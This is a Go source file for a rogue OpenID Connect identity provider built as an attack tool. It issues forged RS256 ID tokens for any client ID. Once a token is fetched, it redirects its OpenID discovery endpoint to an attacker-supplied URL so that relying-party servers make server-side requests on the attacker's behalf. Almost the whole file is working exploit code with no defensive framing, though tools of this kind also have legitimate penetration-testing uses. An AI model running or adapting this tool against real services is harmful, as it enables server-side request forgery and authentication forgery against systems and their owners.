package main

import (
	"crypto/rsa"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"strings"
	"time"

	jwt "github.com/dgrijalva/jwt-go"
)

var (
	listener string
	issuer   string
	ssrf     string
	key      *rsa.PrivateKey
	jwks     []byte
	useSSRF  bool
)

func handleAuth(w http.ResponseWriter, r *http.Request) {
	redirect := r.URL.Query().Get("redirect_uri")
	if redirect == "" {
		redirect = "http://doy.en.se.c/"
	}
	redirectURL, _ := url.Parse(redirect)
	params := redirectURL.Query()
	params.Set("state", r.URL.Query().Get("state"))
	params.Set("code", "bc")

	redirectURL.RawQuery = params.Encode()

	w.Header().Set("Location", redirectURL.String())
	w.WriteHeader(http.StatusTemporaryRedirect)
}

func handleOpenid(w http.ResponseWriter, r *http.Request) {
	if useSSRF {
		log.Printf("SSRF to %s", ssrf)
		http.Redirect(w, r, ssrf, http.StatusTemporaryRedirect)
		return
	}
	log.Print("Returning nice friendly OpenID Configuration")
	w.Header().Set("Content-Type", "application/json")
	w.Write([]byte(fmt.Sprintf(
		"{\"issuer\":\"%[1]s\",\"authorization_endpoint\":\"%[1]sauthorize\",\"token_endpoint\":\"%[1]soauth/token\",\"device_authorization_endpoint\":\"%[1]soauth/device/code\",\"userinfo_endpoint\":\"%[1]sme\",\"mfa_challenge_endpoint\":\"%[1]smfa/challenge\",\"jwks_uri\":\"%[1]s.well-known/jwks.json\",\"registration_endpoint\":\"%[1]soidc/register\",\"revocation_endpoint\":\"%[1]soauth/revoke\",\"scopes_supported\":[\"openid\",\"profile\",\"offline_access\",\"name\",\"given_name\",\"family_name\",\"nickname\",\"email\",\"email_verified\",\"picture\",\"created_at\",\"identities\",\"phone\",\"address\"],\"response_types_supported\":[\"code\",\"token\",\"id_token\",\"code token\",\"code id_token\",\"token id_token\",\"code token id_token\"],\"code_challenge_methods_supported\":[\"S256\",\"plain\"],\"response_modes_supported\":[\"query\",\"fragment\",\"form_post\"],\"subject_types_supported\":[\"public\"],\"id_token_signing_alg_values_supported\":[\"HS256\",\"RS256\"],\"token_endpoint_auth_methods_supported\":[\"client_secret_basic\",\"client_secret_post\"],\"claims_supported\":[\"aud\",\"auth_time\",\"created_at\",\"email\",\"email_verified\",\"exp\",\"family_name\",\"given_name\",\"iat\",\"identities\",\"iss\",\"name\",\"nickname\",\"phone_number\",\"picture\",\"sub\"],\"request_uri_parameter_supported\":false}",
		issuer,
	)))
}

func makeIDToken(clientID string) (string, error) {
	claims := &jwt.StandardClaims{
		ExpiresAt: 8000000000,
		Issuer:    issuer,
		Audience:  clientID,
		Subject:   "1234",
		IssuedAt:  time.Now().Unix(),
	}

	token := jwt.NewWithClaims(jwt.SigningMethodRS256, claims)
	return token.SignedString(key)
}

// Token is the Oauth Token
type Token struct {
	AccessToken string `json:"access_token"`
	TokenType   string `json:"token_type"`
	IDToken     string `json:"id_token"`
	ExpiresIn   int32  `json:"expires_in"`
	State       string `json:"state"`
	Scope       string `json:"scope"`
}

func makeToken(clientID string) ([]byte, error) {
	idToken, err := makeIDToken(clientID)
	if err != nil {
		return nil, err
	}
	token := &Token{
		AccessToken: "abc",
		TokenType:   "Bearer",
		IDToken:     idToken,
		ExpiresIn:   7200,
		Scope:       "email",
		State:       "st",
	}
	return json.Marshal(token)
}

func handleToken(w http.ResponseWriter, r *http.Request) {
	auth := strings.SplitN(r.Header.Get("Authorization"), " ", 2)
	clientID := "?"
	if len(auth) == 2 {
		basic, err := base64.StdEncoding.DecodeString(auth[1])
		if err == nil {
			up := strings.SplitN(string(basic), ":", 2)
			if len(up) == 2 {
				clientID, err = url.QueryUnescape(up[0])
			}
		}
	}
	log.Printf("Token fetched for %s", clientID)
	if ssrf != "" {
		useSSRF = true // enable SSRF
		log.Print("From now on, requests for OpenID Configuration will get SSRFd!")
	}
	w.Header().Set("Content-Type", "application/json")
	token, err := makeToken(clientID)
	if err == nil {
		w.Write(token)
	} else {
		log.Printf("Error making token: %v", err)
	}
}

func handleJWKS(w http.ResponseWriter, r *http.Request) {
	log.Print("JWKS Fetched")
	w.Header().Set("Content-Type", "application/json")
	w.Write(jwks)
}

func dunno(w http.ResponseWriter, r *http.Request) {
	log.Printf("[%s] %s", r.Method, r.URL.Path)
	w.WriteHeader(http.StatusNotFound)
}

func init() {
	flag.StringVar(&listener, "listen", "0.0.0.0:1337", "Address / port to listen on")
	flag.StringVar(&issuer, "issuer", "https://issuer.url/", "Issuer url (ending in /)")
	flag.StringVar(&ssrf, "ssrf", "", "URL to redirect the openid-configuration to")
}

func main() {
	flag.Parse()
	http.HandleFunc("/authorize", handleAuth)
	http.HandleFunc("/oauth/token", handleToken)
	http.HandleFunc("/.well-known/openid-configuration", handleOpenid)
	http.HandleFunc("/.well-known/jwks.json", handleJWKS)
	http.HandleFunc("/", dunno)

	var err error
	var keyData []byte
	if keyData, err = ioutil.ReadFile("./not-very-private.pem"); err != nil {
		log.Fatalf("Cannot read RSA key not-very-private.pem: %v", err)
	}
	if key, err = jwt.ParseRSAPrivateKeyFromPEM(keyData); err != nil {
		log.Fatalf("Unable to parse RSA private key: %v", err)
	}
	if jwks, err = ioutil.ReadFile("./jwks-public.json"); err != nil {
		log.Fatalf("Cannot read jwks-public.json: %v", err)
	}

	if ssrf == "" {
		log.Print("No SSRF configured (use -h to see help)")
	}

	log.Printf("Listening on %s...", listener)
	log.Fatal(http.ListenAndServe(listener, nil))
}
